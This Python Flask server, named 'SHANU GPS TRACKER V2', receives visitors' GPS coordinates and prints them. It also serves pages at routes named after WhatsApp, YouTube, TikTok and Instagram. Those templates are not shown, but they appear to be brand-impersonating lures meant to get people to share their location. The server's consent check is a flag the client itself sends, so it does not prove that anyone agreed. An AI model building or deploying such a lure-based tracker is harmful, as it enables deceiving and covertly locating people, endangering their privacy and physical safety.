from flask import Flask, request, jsonify, send_from_directory, render_template
from datetime import datetime
import math

app = Flask(__name__, static_folder="static")

@app.route("/")
def home():
    return send_from_directory("static", "index.html")

@app.route("/api/location", methods=["POST"])
def receive_location():
    data = request.get_json(silent=True) or {}

    if data.get("consent") is not True:
        return jsonify({"error": "Consent required"}), 403

    try:
        lat = float(data["latitude"])
        lon = float(data["longitude"])
        accuracy = float(data["accuracy"])

        if not all(map(math.isfinite, [lat, lon, accuracy])):
            raise ValueError()

        if not (-90 <= lat <= 90 and -180 <= lon <= 180):
            raise ValueError()

        if accuracy < 0:
            raise ValueError()

    except (KeyError, TypeError, ValueError):
        return jsonify({"error": "Invalid location data"}), 400

    timestamp = datetime.now().astimezone().isoformat()

    print("\n========== GPS SHARE ==========")
    print("Time:", timestamp)
    print("Latitude:", lat)
    print("Longitude:", lon)
    print("Accuracy:", accuracy, "meters")
    print("===============================\n")

    return jsonify({"status": "success"})


@app.route("/whatsapp")
def whatsapp():
    return render_template("whatsapp.html")

@app.route("/youtube")
def youtube():
    return render_template("youtube.html")


@app.route("/tiktok")
def tiktok():
    return render_template("tiktok.html")


@app.route("/instagram")
def instagram():
    return render_template("instagram.html")

if __name__ == "__main__":
    print("SHANU GPS TRACKER V2")
    app.run(host="127.0.0.1", port=8080, debug=False)
